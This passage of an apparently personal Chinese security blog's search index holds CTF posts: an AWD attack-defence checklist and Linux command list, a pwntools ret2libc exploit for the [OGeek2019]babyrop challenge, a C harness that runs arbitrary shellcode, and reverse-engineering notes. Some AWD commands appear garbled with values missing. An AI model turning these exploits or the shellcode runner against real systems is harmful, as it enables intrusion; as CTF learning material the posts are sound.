title="防守"></a>防守</h2><ul><li><p>备份源码和数据库</p></li><li><p>系统安全性检查。关闭3306！！、限制ssh登录，修改ssh密码，Mysql是否默认密码==写脚本刷!==</p></li><li><p>部署WAF@zx</p></li><li><p>修改权限。修改Mysql权限等。</p></li><li><blockquote><p>监控可读写权限的目录是否新增、删除文件并及时提醒。这里说下，如果被种了不死马的话通常有以下几种克制方法。</p><ul><li><p>强行 kill 掉进程后重启服务</p></li><li><p>建立一个和不死马相同名字的文件或者目录</p></li><li><p>写脚本不断删除文件</p></li><li><p>不断写入一个和不死马同名的文件</p></li></ul><ol start="6"><li>部署流量监控脚本或开启服务器日志记录。目的主要是为了进行流量回放，看其它大佬如何用我们没发现的漏洞来打我们的机子，抓取到之后把看不懂的流量直接回放到别的机子去，这里还得提到，我们自己在攻击的时候，也要试着混淆一下自己的攻击流量，不能轻易被别人利用。<br>————————————————<br>版权声明：本文为CSDN博主「neversec」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/github_35912913/article/details/89336506" target="_blank" rel="noopener">https://blog.csdn.net/github_35912913/article/details/89336506</a></li></ol></blockquote></li><li><p>流量监控脚本</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.服务器所需要的软件包，避免服务器上没有</p><p>2.EXP和漏洞库</p><p>3.加固、基线检查漏洞</p><p>4.WAF代码和部署脚本</p><p>5.批量拿shell、提交flag、维持权限的代码或小框架</p><p><strong>软件包也得看给你的服务器有无足够的权限去运行</strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>AWD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AWD常用指令</title>
    <link href="/2020/01/13/AWD%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2020/01/13/AWD%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="AWD常用指令"><a href="#AWD常用指令" class="headerlink" title="AWD常用指令"></a>AWD常用指令</h1><p>备份web目录</p><pre><code>tar -zcvf web.tar.gz /var/www/html/</code></pre><p>查看已建立网络连接和对应进程</p><pre><code>netstat -antulp | grep EST</code></pre><p>用户管理</p><p>w    查看当前用户</p><pre><code>pkill -kill -t &lt;Username&gt;</code></pre><p>查看指定端口被哪个进程占用</p><pre><code>lsof -i:端口号 或者 netstat -tunlp|grep 端口号</code></pre><pre><code>#备份mysql数据库mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql　　　　mysqldump --all-databases &gt; bak.sql　　　　　　#还原mysql数据库mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql　　find / *.php -perm  　　 　　awk -F:  /etc/passwd　　　　crontab -l　　　</code></pre><pre><code class="#结束进程命令">#检测所有的tcp连接数量及状态netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn#查看页面访问排名前十的IPcat /var/log/apache2/access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　#查看页面访问排名前十的URLcat /var/log/apache2/access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -</code></pre><pre><code>#封杀某个IP或者ip段，如：.　　iptables -I INPUT -s . -j DROPiptables -I INPUT -s ./ -j DROP#禁止从某个主机ssh远程访问登陆到本机，如123..　　iptable -t filter -A INPUT -s . -p tcp --dport  -j DROP　　</code></pre><p><strong>封杀ip一旦发现直接取消比赛资格的，转发流量也是</strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>AWD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>[OGeek2019]babyrop</title>
    <link href="/2020/01/13/%5BOGeek2019%5Dbabyrop/"/>
    <url>/2020/01/13/%5BOGeek2019%5Dbabyrop/</url>
    
    <content type="html"><![CDATA[<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><img src="/2020/01/13/%5BOGeek2019%5Dbabyrop/image-20200109113815190.png" srcset="/img/loading.gif" class="" title="image-20200109113815190"><h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><img src="/2020/01/13/%5BOGeek2019%5Dbabyrop/image-20200109113247829.png" srcset="/img/loading.gif" class="" title="image-20200109113247829"><img src="/2020/01/13/%5BOGeek2019%5Dbabyrop/image-20200109113307666.png" srcset="/img/loading.gif" class="" title="image-20200109113307666"><p>为了绕过strncmp，我们在v6这里可以放一个\x00 因为strlen会在识别到\x00之后停止，这样strncmp就会默认返回0</p><img src="/2020/01/13/%5BOGeek2019%5Dbabyrop/image-20200109113459963.png" srcset="/img/loading.gif" class="" title="image-20200109113459963"><p>这里的v5返回值又跟下面的a1是一致的</p><img src="/2020/01/13/%5BOGeek2019%5Dbabyrop/image-20200109113326191.png" srcset="/img/loading.gif" class="" title="image-20200109113326191"><img src="/2020/01/13/%5BOGeek2019%5Dbabyrop/image-20200109113733376.png" srcset="/img/loading.gif" class="" title="image-20200109113733376"><p>这里也没有啥可以调用的</p><p>那就是rop，leak libc了</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h3 id="leak-libc版"><a href="#leak-libc版" class="headerlink" title="leak libc版"></a>leak libc版</h3><pre><code class="python">#!/usr/bin/python2.7# -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;[OGeek2019]babyrop&#39;)lib = ELF(&quot;./libc-2.23.so&quot;)sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./[OGeek2019]babyrop&#39;)        lib = ELF(&quot;./libc-2.23.so&quot;)    else:        sh = remote(ip,port)        lib = ELF(&quot;./libc-2.23.so&quot;)    main_start = 0x8048825    write_plt = elf.plt[&#39;write&#39;]    write_got = elf.got[&#39;write&#39;]    pop_ret = 0x80488F9    libc = elf.got[&#39;__libc_start_main&#39;]    payload = &quot;\x00&quot;    payload += &quot;\xff&quot; * 7    sh.sendline(payload)    sh.recvuntil(&quot;Correct\n&quot;)    payload = cyclic(0xE7 + 0x4)    payload += p32(write_plt)    payload += p32(pop_ret)    payload += p32(1)    payload += p32(libc)    payload += p32(4)    payload += p32(main_start)    sh.sendline(payload)    __libc_start_main = u32(sh.recv(4))    libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]    system = libc + lib.symbols[&#39;system&#39;]    binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()    log.success(&quot;libc: &quot; + hex(libc))    log.success(&quot;system: &quot; + hex(system))    log.success(&quot;binsh: &quot; + hex(binsh))    payload = &quot;\x00&quot;    payload += &quot;\xff&quot; * 7    sh.sendline(payload)    sh.recvuntil(&quot;Correct\n&quot;)    payload = cyclic(0xE7 + 0x4)    payload += p32(system)    payload += p32(0xdeadbeef)    payload += p32(binsh)    sh.sendline(payload)    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;node3.buuoj.cn&quot;,29257,0 )</code></pre><h3 id="leak-write"><a href="#leak-write" class="headerlink" title="leak write"></a>leak write</h3><pre><code class="python">#!/usr/bin/python2.7# -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;[OGeek2019]babyrop&#39;)lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./[OGeek2019]babyrop&#39;)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        lib = ELF(&quot;./libc-2.23.so&quot;)    main_start = 0x8048825    write_plt = elf.plt[&#39;write&#39;]    write_got = elf.got[&#39;write&#39;]    pop_ret = 0x80488F9    payload = &quot;\x00&quot;    payload += &quot;\xff&quot; * 7    sh.sendline(payload)    sh.recvuntil(&quot;Correct\n&quot;)    payload = cyclic(0xE7 + 0x4)    payload += p32(write_plt)    payload += p32(pop_ret)    payload += p32(1)    payload += p32(write_got)    payload += p32(4)    payload += p32(main_start)    sh.sendline(payload)    write_addr = u32(sh.recv(4))    libc = write_addr - lib.symbols[&#39;write&#39;]    system = libc + lib.symbols[&#39;system&#39;]    binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()    log.success(&quot;libc: &quot; + hex(libc))    log.success(&quot;system: &quot; + hex(system))    log.success(&quot;binsh: &quot; + hex(binsh))    payload = &quot;\x00&quot;    payload += &quot;\xff&quot; * 7    sh.sendline(payload)    sh.recvuntil(&quot;Correct\n&quot;)    payload = cyclic(0xE7 + 0x4)    payload += p32(system)    payload += p32(0xdeadbeef)    payload += p32(binsh)    sh.sendline(payload)    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;node3.buuoj.cn&quot;,29257,0)</code></pre><h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><pre><code class="c">#include&lt;stdio.h&gt;int main(){ char a[] = {&#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;};   char b[] = {&#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;};   char buffer[10];  sprintf(buffer, &quot;%.4s%.4s&quot;, a, b);   printf(&quot;%s\n&quot;, buffer);  return 0;}</code></pre><img src="/2020/01/13/%5BOGeek2019%5Dbabyrop/SouthEast.png" srcset="/img/loading.gif" class="" title="img"><p>将ab写入buffer</p><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>ssize_t read (int fd, void *buf, size_t count);<br>read(a,buf,c)<br>打开文件a，读取c个字节，存到buf中<br>返回实际读到的字节数。如果出错 返回-1</p><p>read(0,&amp;buf,4u)</p><p>从shell读取4u到buf中</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>19/9/20笔记</title>
    <link href="/2019/11/29/19920%E7%AC%94%E8%AE%B0/"/>
    <url>/2019/11/29/19920%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="逆向笔记"><a href="#逆向笔记" class="headerlink" title="逆向笔记"></a>逆向笔记</h1><p>PE是windows下的文件，ELF是linux/unix下的文件</p><p>packer壳</p><p>28537194573619560LL LL-&gt;长长整型</p><p>可在汇编语言中寻找到mov rax ，指针 沿着指针 再按R看转换后的内容（由于低尾端，栈地址向低地址扩展，所以要将字符串反过来）</p><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p>b 函数名</p><blockquote><p>下断点breakpoint</p><pre><code>b __libc_start_main #在主函数设置断点</code></pre></blockquote><p>set</p><pre><code>set $eip=地址 #跳转到某函数地址set $eip=0x0804849b</code></pre><p>r</p><blockquote><p>run 运行到我们下断点的地方，停止</p></blockquote><p>n</p><blockquote><p>运行一步</p></blockquote><p>x/200wx $寄存器</p><blockquote><p>x:就是用来查看内存中数值的，后面的200代表查看多少个，wx代表是以word字节查看看，$eax代表的eax寄存器中的值</p></blockquote><h2 id="反编译pyc"><a href="#反编译pyc" class="headerlink" title="反编译pyc"></a>反编译pyc</h2><blockquote><p>uncompyle2 -h</p></blockquote><p>==md5(md5($pass)) ：第一次加密后，结果转换成小写，对结果再加密一次.解密为：解密一次后，再解密一次==</p><p><img src="19920%E7%AC%94%E8%AE%B0%5Cimage-20190820013756861.png" srcset="/img/loading.gif" alt="image-20190820013756861"></p><blockquote><p>Re2-cpp-is-awesome</p></blockquote><pre><code class="cpp">if ( a1 != 2 )  {    v3 = *a2;    v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Usage: &quot;, a3);    v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v4, v3, v5);    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v6, &quot; flag\n&quot;, v7);    exit(0);  }                                             // 检测输入  std::allocator&lt;char&gt;::allocator(&amp;v13, a2, a3);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v12, a2[1], &amp;v13);  std::allocator&lt;char&gt;::~allocator(&amp;v13);  v15 = 0;  for ( i = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::begin(&amp;v12); ; iplusplus(&amp;i) )  {    v14 = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::end(&amp;v12);    if ( !iNotEqualV14((__int64)&amp;i, (__int64)&amp;v14) )      break;    v9 = *(unsigned __int8 *)thesame((__int64)&amp;i);    if ( (_BYTE)v9 != originalKey[Number[v15]] )//key      betterLuckNextTime((__int64)&amp;i, (__int64)&amp;v14, v9);    ++v15;  }  coutShouldHaveFlagNow((__int64)&amp;i, (__int64)&amp;v14, v8);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v12);  return 0LL;</code></pre><pre><code class="python">key = &#39;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_{FL4G}_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&#39;dump = [0x24,0x00,0x05,0x36,0x65,0x07,0x27,0x26,0x2D,0x01,0x03,0x00,0x0D,0x56,0x01,0x03,0x65,0x03,0x2D,0x16,0x02,0x15,0x03,0x65,0x00,0x29,0x44,0x44,0x01,0x44,0x2B]flag = &#39;&#39;for i in dump:    flag +=key[i]print(flag)</code></pre><p><img src="19920%E7%AC%94%E8%AE%B0%5Cimage-20190820143248918.png" srcset="/img/loading.gif" alt="image-20190820143248918"></p><p>记得全都要写下来，包括0</p><hr><p><img src="19920%E7%AC%94%E8%AE%B0%5Cimage-20190821163335042.png" srcset="/img/loading.gif" alt="image-20190821163335042"></p><p>不止可能是保存，还有可能读取文本中的字符串与程序里的对比</p><hr><p>IDA </p><p>快捷键Y 输入 char a[0x大小] 就可以自动转成字符串</p><p>汇编的条件跳转指令:</p><p>​      jmp :无条件跳转 (jump)</p><p>​      je/jz :结果为0跳转 (jump zero)</p><p>​      jnz/jne: 结果不为0跳转 (jump not zero)</p><p>​      js:结果为负跳转 (Jump if sign)</p><p>​      jns:结果为正跳转(Jump if not sign)</p><p>​      jb:小于则跳转（Jump below）</p><p>​     jnb:大于或等于则跳转(Jump not below)</p><p><a href="https://www.jianshu.com/p/dc3f6437c108" target="_blank" rel="noopener">运用Z来使得程序按照自己想法执行</a></p><p><img src="19920%E7%AC%94%E8%AE%B0%5Cimage-20190830134741936.png" srcset="/img/loading.gif" alt="image-20190830134741936"></p><hr><h3 id="大小端！！！！！！"><a href="#大小端！！！！！！" class="headerlink" title="大小端！！！！！！"></a>大小端！！！！！！</h3><p><img src="19920%E7%AC%94%E8%AE%B0%5Cimage-20190822204713754.png" srcset="/img/loading.gif" alt="image-20190822204713754"></p><p>mercedes!!!!</p><hr><p><img src="19920%E7%AC%94%E8%AE%B0%5Cimage-20190826101318562.png" srcset="/img/loading.gif" alt="image-20190826101318562"></p><p>搜索字符串</p><p><img src="19920%E7%AC%94%E8%AE%B0%5Cimage-20190826101343642.png" srcset="/img/loading.gif" alt="image-20190826101343642"></p><p>双击flag可找到使用地址</p><p>继续双击DATA XREF后面的信息可跳转到命令起始地址</p><hr><p>链表<a href="https://www.jianshu.com/p/7779f3e83384" target="_blank" rel="noopener">https://www.jianshu.com/p/7779f3e83384</a></p><p><a href="https://www.cnblogs.com/ha2ha2/p/7943339.html" target="_blank" rel="noopener">https://www.cnblogs.com/ha2ha2/p/7943339.html</a></p><hr><p>ext3</p><pre><code>mount filename /mnt/cd /mnt/find | grep &#39;flag&#39;</code></pre><hr><p>kali</p><pre><code>pdftotext filename.pdf 1.txt</code></pre><hr><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>用chrome打开pdf 复制所有字符 A.B-</p><p>逐帧查看，或者使用stegslove</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>What a day</title>
    <link href="/2019/11/19/What%20a%20day/"/>
    <url>/2019/11/19/What%20a%20day/</url>
    
    <content type="html"><![CDATA[<p>明明说要调整作息的，结果头疼晚上睡了会，现在一点都不困了。。。。</p><h2 id="想学逆向"><a href="#想学逆向" class="headerlink" title="想学逆向"></a>想学逆向</h2><p>发现了mac上的一些软件之类的，<a href="https://www.jianshu.com/p/c04ac36c6641?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">link</a></p><p>入门<a href="https://blog.csdn.net/qq_21508727/article/details/80559270" target="_blank" rel="noopener">link</a></p><p>pwn学习流程<br>– [ ] 小甲鱼视频<br>– [ ] liveoverflow那一套视频入门<br>– [ ] Ctfwiki，每种类型例题跟着做一遍，realworld就漏洞战争，google project zero博客之类的<br>– [ ] 栈简单汇编就行，堆要去看linux源码,Malloc和free部分,常见的dlmalloc和ptmalloc,还有fastbins，glibc2.26之后是trachebins，所以还要看不同版本的源码</p><h2 id="在线ctf平台"><a href="#在线ctf平台" class="headerlink" title="在线ctf平台"></a>在线ctf平台</h2><p><a href="https://i.loli.net/2019/08/06/Jht7r9DY4xadcQZ.png" target="_blank" rel="noopener">![ctf平台](What a day/Jht7r9DY4xadcQZ.png)</a></p><p>下那么多游戏就为了一起玩嘛。。。这样吧，等战雷会员过期了就删了吧。嗯</p><h1 id="GOGOGO！"><a href="#GOGOGO！" class="headerlink" title="GOGOGO！"></a>GOGOGO！</h1><h1 id="过几天重新开始一大早起床跑步吧"><a href="#过几天重新开始一大早起床跑步吧" class="headerlink" title="过几天重新开始一大早起床跑步吧!"></a>过几天重新开始一大早起床跑步吧!</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>转载-编写shellcode测试工具</title>
    <link href="/2019/11/19/%E7%BC%96%E5%86%99shellcode%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    <url>/2019/11/19/%E7%BC%96%E5%86%99shellcode%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<p>不知不觉，shellcode已成功攻击过程中必不可少的步骤，后面的文章会继续介绍如何编写其它类型的shellcode。直到目前为止，每次完shellcode汇编代码，都需要找到之前（或者重新编写）带缓冲区溢出漏洞的代码进行测试，同时要不停地对准EIP以及esp地址。这对于测试shellcode的正确性来说，很不方便，也难以调试。为此，我们先编写shellcode测试工具，方便后面测试shellcode，所谓磨刀不误砍柴功。</p><p>shellcode测试工具sctest<br>我们将工具取名为sctest，是shell code test的缩写。<br>命令用法：sctest  &lt;shellcode二进制文件&gt;</p><p>该程序的实现很简单：</p><p>1） 读shellcode 二进制读到内存<br>2）将装载shellcode内存的属性变成可执行<br>3）跳到该shellcode执行</p><p>代码如下：</p><pre><code class="c">#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;char code[4096] __attribute__((aligned(4096)));int main(int argc, const char *argv[]){    int fd;    int ret;    void (*func)(void);    if (argc != 2) {    fprintf(stderr, &quot;\n\tUsage: sctest &lt;shellcode&gt;\n\n&quot;);    return 1;    }    fd = open(argv[1], O_RDONLY);    if (!fd) {    fprintf(stderr, &quot;Unable open file %s, err = %d(%m)\n&quot;, argv[1], errno);    return 2;    }    ret = read(fd, code, sizeof(code));    if (ret &lt; 0) {        fprintf(stderr, &quot;Unable read file %s, err = %d(%m)\n&quot;, argv[1], errno);        return 3;    }    ret = mprotect(code, sizeof(code), PROT_EXEC);    if (ret &lt; 0) {        fprintf(stderr, &quot;Unable mprotect, err = %d(%m)\n&quot;, errno);        return 4;    }    /* execute shell code */    func = (void (*)(void))code;    func();    abort();  }</code></pre><p>编译<br>到目前为止，shellcode的运行环境都是32位应用程序，以后涉及64位应用程序；由于同一程序不能混搭32和64位指令，因此需要编译两个工具（32位和64位）</p><p>$ gcc -Wall -g -o sctest32 sctest.c -m32<br>$ gcc -Wall -g -o sctest sctest.c</p><p>测试以前的shellcode</p><p>上篇文章中，介绍如何编写本地shellcode，使用sctest32工具对它进行测试：</p><p>当前 bash的pid</p><p>$ echo $$<br>2180</p><p>测试shellcode<br>ivan@ivan:~/exploit/tools$ ./sctest32 ../shell2</p><p>运行shellcode后sh的pid<br>$ echo $$<br>3178</p><p>两个pid不一样，说明 shell2成功启动了一个新sh</p><p>在后面的shellcode介绍中，我们会使用sctest32/sctest工具进行独立测试，不依赖于漏洞代码。</p><hr><p>版权声明：本文为CSDN博主「海枫」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/linyt/article/details/43538837" target="_blank" rel="noopener">https://blog.csdn.net/linyt/article/details/43538837</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World!</title>
    <link href="/2019/11/19/hello-world/"/>
    <url>/2019/11/19/hello-world/</url>
    
    <content type="html"><![CDATA[<p>2019/8/3日 15：22，我的网站算是正式开通了。这里可能是我展现最真实的我的地方，也用来记录我的学习过程和学习资料。在此先感谢一下毛同学的大力鼓吹，让我搞了这个，也感谢我的学校给我报销（笑</p><p>最近在学校的大数据班学习了在centOS搭建hadoop平台（使用java进行程序编写），最开始的是计算和管理都在一个模拟机里的伪分布式，一主一仆的也在回家后在自家电脑上完成了搭建。</p><p>后来为了搞github和gitee备份代码，又去研究了git如何使用，以及在vscode里同步代码，现在也是可以啦~点这可以看 相关代码和操作</p><p>为了在学校更好的敲代码（装逼），也是打算买一个豆子峡谷，装上黑苹果和centOS，平时用黑苹果和我的surface，计算时就用centOS。不得不说i58259U这东西好像挺强的，2/3个8700k，对比i7 8559u差距也不大。</p><p>今天也开始了DVWA的学习，学习使用kali，（虽然今早也没搞多少。。好像就搞了个Brup Force，连Brup Suite的爆破也没完全弄懂咋搞。。</p><p>就先这样吧。还有很多很多没搞懂，但最首先的先享受一下我最后的十来天暑假吧!</p><p>更新：11/19 使用hexo并部署到了github上，打算使用自己的云服务器做加速= =</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
